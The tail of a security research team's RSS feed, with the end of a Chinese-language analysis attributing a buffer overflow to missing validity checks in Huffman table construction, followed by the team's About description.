&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;         ReplicateValue(&amp;amp;table[key &amp;gt;&amp;gt; root_bits], step, table_size, code);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         key = GetNextKey(key, len);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因此，漏洞很可能是由于在构建Huffman Table时，没有对输入的数据进行有效性检查，从而导致分配给表的内存区域被溢写，即出现了缓冲区溢出。&lt;/p&gt;</description>
    </item>
    <item>
      <title>About</title>
      <link>https://www.darknavy.org/zh/about/</link>
      <pubDate>Thu, 02 Nov 2023 17:11:58 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/about/</guid>
      <description>&lt;p&gt;We are DARKNAVY, an independent and free-spirited security research team and service provider. We have established AVSS (Adversarial Vulnerability Scoring System) to evaluate vulnerabilities and the effectiveness of system mitigation mechanisms in real adversarial environments.&lt;/p&gt;
&lt;p&gt;Over the past 20 years, we have been at the forefront of cybersecurity research and application, winning multiple world championships. We have also established GEEKCON, a unique and top-class security geek competition, and responsibly disclosed over 1000 severe vulnerabilities. With relentless efforts, we have helped over 100 companies worldwide address security issues, contributing to the growth of the cybersecurity industry.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
